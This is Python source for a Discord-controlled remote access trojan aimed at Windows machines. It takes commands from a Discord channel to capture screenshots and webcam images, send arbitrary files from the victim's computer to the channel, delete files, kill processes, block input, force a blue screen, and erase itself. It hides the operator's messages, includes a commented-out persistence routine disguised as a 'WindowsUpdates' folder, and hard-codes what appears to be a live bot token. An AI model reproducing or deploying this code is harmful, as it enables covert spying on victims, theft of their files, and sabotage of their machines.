import discord
import os
import libs.computer as pc
import libs.powershell as pw
from shutil import copy;
import winshell
from win32com.client import Dispatch

#TODO
# - Add more commands
# - Fix boot persistence


modules_path = os.getcwd() + "\modules"
client = discord.Client(intents=discord.Intents.all())
#boot_path = os.getenv("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup"

def load_modules():
    for module in os.listdir(modules_path):
        if module.endswith(".py"):
            os.popen(f"py {modules_path}/{module}")

@client.event
async def on_ready():
    print(f"Bot started.")
    """
    if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
        os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
    if os.path.exists(f"{boot_path}\Run.lnk") == False:
        target = __file__
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(f"{boot_path}\Run.lnk")
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = target
        shortcut.save()
    """

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    #HELP
    if message.content.startswith(".help"):
        await message.delete()
        commandlist = """
            .help - Get command list
            .pcinfo - Get computer information
            .shutdown - Shutdown computer
            .hardware - Get hardware information
            .dir - Get directory
            .tasklist - Get tasklist
            .taskkill - Kill task
            .screenshot - Take screenshot
            .copy - Copy file
            .bsod - BSOD
            .webcam - Take webcamshot
            .logout - Logout
            .delete - Delete file
            .blockinput - Block input
            .unblockinput - Unblock input
            .selfdestruct - Deletes all traces of the bot
        """
        embed = discord.Embed(title="Command list", description=commandlist)
        await message.channel.send(embed=embed)

    #SELF DESTRUCT
    if message.content.startswith(".selfdestruct"):
        await message.delete()
        embed = discord.Embed(title="Self Destruct", description="Attempting to self destruct...")
        await message.channel.send(embed=embed)
        pc.self_destruct()
        embed = discord.Embed(title="Self Destruct successful")
        await message.channel.send(embed=embed)
        quit()

    #COMPUTER INFORMATION
    if message.content.startswith(".pcinfo"):
        await message.delete()
        await message.channel.send(embed=pc.comp_info()[0])
        await message.channel.send(file=pc.comp_info()[1])
        os.rmdir("pc_info.txt")

    #SHUTDOWN
    if message.content.startswith(".shutdown"):
        await message.delete()
        embed = discord.Embed(title="Shutdown", description="Attempting to shutdown...")
        await message.channel.send(embed=embed)
        try:
            pc.pc_shutdown()
        except:
            embed = discord.Embed(title="Shutdown", description="Failed to shutdown.")
        await message.channel.send(embed=embed)

    #HARDWARE INFORMATION
    if message.content.startswith(".hardware"):
        await message.delete()
        embed = discord.Embed(title="Hardware Information", description=pc.hardware_info(), color=0x00ff00)
        await message.channel.send(embed=embed)

    #DIR
    if message.content.startswith(".dir"):
        directory = message.content.replace(".dir ", "")
        await message.delete()
        try:
            result = pw.dir(directory)
        except Exception as e  :
            print(e)
            embed = discord.Embed(title="Directory", description="Failed to get directory. Usage .dir c:", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Directory", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #TASKLIST - TO FIX
    if message.content.startswith(".tasklist"):
        process = message.content.replace(".tasklist ", "")
        await message.delete()
        try:
            result = pw.tasklist(process)
            print(result)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Tasklist", description="Failed to get tasklist.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Tasklist", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #TASKKILL
    if message.content.startswith(".taskkill"):
        task = message.content.replace(".taskkill ", "")
        result = ""
        await message.delete()
        try:
            result = pw.taskkill(task)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Taskkill", description="Failed to kill task.", color=0x00ff00)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="Taskkill", description=result, color=0x00ff00)
        await message.channel.send(embed=embed)

    #SCREENSHOT
    if message.content.startswith(".screenshot"):
        await message.delete()
        try:
            sc = pc.screenshot()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Screenshot", description="Failed to take screenshot.", color=0x00ff00)
            return
        embed = discord.Embed(title="Screenshot", description="Screenshot taken.", color=0x00ff00)
        await message.channel.send(file=discord.File(sc), embed=embed)

    #COPY
    if message.content.startswith(".copy"):
        loc = message.content.replace(".copy ", "")
        await message.delete()
        embed = discord.Embed(title="Copy", description="File copied.", color=0x00ff00)
        await message.channel.send(file=discord.File(loc),embed=embed)
    
    #BSOD
    if message.content.startswith(".bsod"):
        await message.delete()
        try:
            pc.bsod()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="BSOD", description="Failed to BSOD.", color=0x00ff00)
            return
        embed = discord.Embed(title="BSOD", description="BSOD Executed.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #WEBCAMSHOT
    if message.content.startswith(".webcam"):
        await message.delete()
        try:
            wc = pc.webcamshot()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Webcamshot", description="Failed to take webcamshot.", color=0x00ff00)
            return
        embed = discord.Embed(title="Webcamshot", description="Webcamshot taken.", color=0x00ff00)
        await message.channel.send(embed=embed,file=discord.File(wc))

    #LOGOUT
    if message.content.startswith(".logout"):
        await message.delete()
        embed = discord.Embed(title="Logout", description="Logging out...", color=0x00ff00)
        await message.channel.send(embed=embed)
        os.system("shutdown -l")

    #DELETE
    if message.content.startswith(".delete"):
        file_path = message.content.replace(".delete ", "")
        await message.delete()
        try:
            os.remove(file_path)
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Delete", description="Failed to delete file.", color=0x00ff00)
            return
        embed = discord.Embed(title="Delete", description="File deleted.", color=0x00ff00)
        await message.channel.send(embed=embed)

    #BLOCK INPUT
    if message.content.startswith(".blockinput"):
        await message.delete()
        try:
            pc.block_input()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Block Input", description="Failed to block input.", color=0x00ff00)
            return
        embed = discord.Embed(title="Block Input", description="Input blocked.", color=0x00ff00)
        await message.channel.send(embed=embed)
    
    #UNBLOCK INPUT
    if message.content.startswith(".unblockinput"):
        await message.delete()
        try:
            pc.unblock_input()
        except Exception as e:
            print(e)
            embed = discord.Embed(title="Unblock Input", description="Failed to unblock input.", color=0x00ff00)
            return
        embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
        await message.channel.send(embed=embed)
client.run("MTE2OTU4MDgwOTQxNDUyOTA2NQ.G-rRef.fnbeuU_NqaBHxyb2Qsr4P1NLilaH9LMkD72mEw")

